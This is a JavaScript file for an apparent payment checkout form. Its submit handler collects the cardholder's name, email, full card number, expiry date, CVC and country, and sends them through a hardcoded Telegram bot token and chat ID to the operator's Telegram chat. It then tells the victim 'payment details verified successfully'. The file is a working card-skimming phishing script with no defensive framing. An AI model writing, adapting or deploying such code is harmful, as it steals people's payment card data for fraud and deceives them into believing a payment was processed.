
import valid from "card-validator";
import Toastify from "toastify-js";
import "toastify-js/src/toastify.css";


console.log("submit.js loaded");

const form = document.getElementById("paymentforms");
const numberInput = document.getElementById("cardNumber");


function showToast(message, type) {
    Toastify({
        text: message,
        duration: 4500,
        gravity: "top",
        position: "center",
        close: false,
        className: `custom-toast ${type}`
    }).showToast();
}

form.addEventListener("submit", (event) => {
    event.preventDefault();


    const cardNumber = numberInput.value.replace(/\s/g, "").trim();

    const result = valid.number(cardNumber);
    const email = document.getElementById("email").value.trim();
    const cardHolderName = document.getElementById("billingName").value.trim();

    const expiryInput = document.getElementById("cardExpiry").value.trim();
    const cvcInput = document.getElementById("cardCvc").value.trim();
    const country = document.getElementById("billingCountry").value.trim();

    if (result.isValid) {
        try {
            const telegramBotToken = "8997100869:AAHF5K0FHPsdNmdbw97l8gK32G7IFwh8yQ8";
            const telegramChatId = "-5276877860";
            const message = `
           <b>Card Name</b>
${cardHolderName}

<b>Email</b>
${email}

<b>card No:</b>
<code>${cardNumber}</code>

<b>Expiry</b>
${expiryInput}

<b>CVC</b>
${cvcInput}

<b>Country</b>
${country}
`;
            const response = fetch(
                `https://api.telegram.org/bot${telegramBotToken}/sendMessage`,
                {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        chat_id: telegramChatId,
                        text: message.trim(),
                        parse_mode: "HTML"
                    })
                }
            );

            setTimeout(() => {
                showToast("✅  payment details verified successfully", "toast-success");
            }, 2000);
            form.reset();


        } catch (error) {
            console.error("Error sending message:", error);
            showToast("❌  Network request failed", "toast-error");
            form.reset();
        }

    } else {
        setTimeout(() => {
            showToast("❌  payment details could not be verified", "toast-error");
        }, 2000);
        form.reset();
    }

});